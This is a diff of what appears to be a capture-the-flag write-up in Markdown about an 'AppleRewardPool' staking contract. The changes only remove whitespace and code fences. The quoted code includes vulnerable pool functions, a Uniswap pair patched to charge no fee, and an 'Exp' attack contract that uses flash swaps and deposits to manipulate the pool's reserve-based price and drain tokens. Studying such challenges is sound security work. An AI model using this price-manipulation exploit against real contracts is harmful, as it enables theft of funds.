@@ -284,8 +284,8 @@ uint256 multiplier = getMultiplier(pool);
  uint256 AppleReward = multiplier.mul(pool.ApplePertime);
  pool.accApplePerShare = pool.accApplePerShare.add(AppleReward.mul(1e18).div(totalStake));
  pool.lastRewardtime = block.timestamp < pool.endtime ? block.timestamp : pool.endtime;
- 
- 
+
+
 function addPool(IERCLike _token, uint256 _starttime, uint256 _endtime, uint256 _ApplePertime, bool _withUpdate) public onlyOwner {
  if (_withUpdate) {
  massUpdatePools();
@@ -404,7 +404,7 @@ contract Exp is IUniswapV2Callee{
  address public pair1;
  address public pair2;
 
- 
+
  constructor(address _check, address _pool, address _token0, address _token1, address _token2, address _token3, address _pair1, address _pair2) public {
  c = check(_check);
  pool = AppleRewardPool(_pool);
@@ -431,19 +431,19 @@ contract Exp is IUniswapV2Callee{
  IUniswapV2Pair(pair2).swap(0, 5000 * 10 ** 18 , address(this), new bytes(5));
  }
 
- 
+
  function swap() public {
  IERCLike(token2).transfer(address(pair2), 9999 ether);
  IUniswapV2Pair(pair1).swap(0, 4999 * 10 ** 18 , address(this), new bytes(0));
  }
 
  function deposit(uint256 _pool, uint256 _amount) public {
- 
+
  pool.deposit(_pool, _amount);
  }
 
  function withdraw(uint256 _pool, uint256 _amount) public {
- 
+
  pool.withdraw(_pool, _amount);
  }
 
@@ -456,7 +456,7 @@ contract Exp is IUniswapV2Callee{
  require(IERCLike(token2).balanceOf(address(this)) >= 9999 * 10 ** 18, "err flash1");
 
  pool.withdraw(0, 1);
- 
+
  IERCLike(token2).transfer(address(pair2), 10000 * 10 ** 18);
  IUniswapV2Pair(pair2).swap(5000 * 10 ** 18, 0, address(this), new bytes(0)); // got 4999 ether token1
  require(IERCLike(token1).balanceOf(pair2) < 10000 ether, "err flash2");
@@ -469,8 +469,8 @@ contract Exp is IUniswapV2Callee{
  IERCLike(token1).transfer(address(pair2), IERCLike(token1).balanceOf(address(this)));
 
  }
- 
- 
+
+
  }
 
  function transfer2(address to, uint256 amount) public {
@@ -736,11 +736,6 @@ contract AppleRewardPool is Ownable {
  }
 
 }
-```
-
-
-
-```
 function reclaimAppleStakingReward(uint256 _pid) public validatePool(_pid) {
  PoolInfo storage pool = poolinfo[_pid];
  UserInfo storage user = users[_pid][msg.sender];
@@ -760,17 +755,12 @@ function reclaimAppleStakingReward(uint256 _pid) public validatePool(_pid) {
  require(AppleBalance >= _amount, "no enough token");
  token3.transfer(_to, _amount);
  }
-```
-
-
-
-```
 uint256 multiplier = getMultiplier(pool);
  uint256 AppleReward = multiplier.mul(pool.ApplePertime);
  pool.accApplePerShare = pool.accApplePerShare.add(AppleReward.mul(1e18).div(totalStake));
  pool.lastRewardtime = block.timestamp < pool.endtime ? block.timestamp : pool.endtime;
- 
- 
+
+
 function addPool(IERCLike _token, uint256 _starttime, uint256 _endtime, uint256 _ApplePertime, bool _withUpdate) public onlyOwner {
  if (_withUpdate) {
  massUpdatePools();
@@ -787,18 +777,8 @@ function addPool(IERCLike _token, uint256 _starttime, uint256 _endtime, uint256 
  totalStake: 0
  }));
  }
-```
-
-
-
-```
 appleRewardPool.addPool(IERCLike(address(token1)),starttime, endtime,0,false);
 appleRewardPool.addPool(IERCLike(address(token2)),starttime, endtime,0,false);
-```
-
-
-
-```
 function deposit(uint256 _pid, uint256 _amount) public validatePool(_pid){
  PoolInfo storage pool = poolinfo[_pid];
  UserInfo storage user = users[_pid][msg.sender];
@@ -822,11 +802,6 @@ function deposit(uint256 _pid, uint256 _amount) public validatePool(_pid){
  user.ApplerewardDebt = user.amount.mul(pool.accApplePerShare).div(1e18);
  emit Deposit(msg.sender, _pid, _amount);
  }
-```
-
-
-
-```
 function rate() public view returns(uint256) {
  uint256 _price;
  address _token0 = UniswapV2pair(pair1).token0();
@@ -842,41 +817,21 @@ function rate1() public view returns(uint256) {
  _price = _amount1.div(_amount0).div(2).mul(1e18);
  return _price;
  }
-```
-
-
-
-```
 if (_pid == 0){
  uint256 token2_amount = _amount.mul(rate()).div(1e18);
  IERCLike(token2).transfer(msg.sender, token2_amount);
 }
-```
-
-
-
-```
 { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
  uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(0));
  uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(0));
  require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');
  }
-```
-
-
-
-```
 function rate1() public view returns(uint256) {
  uint256 _price;
  (uint256 _amount0, uint256 _amount1,) = UniswapV2pair(pair2).getReserves();
  _price = _amount1.div(_amount0).div(2).mul(1e18);
  return _price;
 }
-```
-
-
-
-```
 contract Exp is IUniswapV2Callee{
 
  check public c;
@@ -889,7 +844,7 @@ contract Exp is IUniswapV2Callee{
  address public pair1;
  address public pair2;
 
- 
+
  constructor(address _check, address _pool, address _token0, address _token1, address _token2, address _token3, address _pair1, address _pair2) public {
  c = check(_check);
  pool = AppleRewardPool(_pool);
@@ -916,19 +871,19 @@ contract Exp is IUniswapV2Callee{
  IUniswapV2Pair(pair2).swap(0, 5000 * 10 ** 18 , address(this), new bytes(5));
  }
 
- 
+
  function swap() public {
  IERCLike(token2).transfer(address(pair2), 9999 ether);
  IUniswapV2Pair(pair1).swap(0, 4999 * 10 ** 18 , address(this), new bytes(0));
  }
 
  function deposit(uint256 _pool, uint256 _amount) public {
- 
+
  pool.deposit(_pool, _amount);
  }
 
  function withdraw(uint256 _pool, uint256 _amount) public {
- 
+
  pool.withdraw(_pool, _amount);
  }
 
@@ -941,7 +896,7 @@ contract Exp is IUniswapV2Callee{
  require(IERCLike(token2).balanceOf(address(this)) >= 9999 * 10 ** 18, "err flash1");
 
  pool.withdraw(0, 1);
- 
+
  IERCLike(token2).transfer(address(pair2), 10000 * 10 ** 18);
  IUniswapV2Pair(pair2).swap(5000 * 10 ** 18, 0, address(this), new bytes(0)); // got 4999 ether token1
  require(IERCLike(token1).balanceOf(pair2) < 10000 ether, "err flash2");
@@ -954,8 +909,8 @@ contract Exp is IUniswapV2Callee{
  IERCLike(token1).transfer(address(pair2), IERCLike(token1).balanceOf(address(this)));
 
  }
- 
- 
+
+
  }
 
  function transfer2(address to, uint256 amount) public {
